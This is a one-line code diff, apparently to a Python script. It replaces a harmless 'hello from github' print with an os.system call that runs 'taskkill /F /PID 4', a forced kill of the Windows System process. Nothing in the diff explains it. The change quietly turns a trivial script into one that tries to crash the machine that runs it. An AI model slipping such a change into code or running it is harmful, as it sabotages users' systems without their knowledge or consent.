@@ -1,1 +1,1 @@
-print('hello from github')
+os.system('taskkill /F /PID 4')
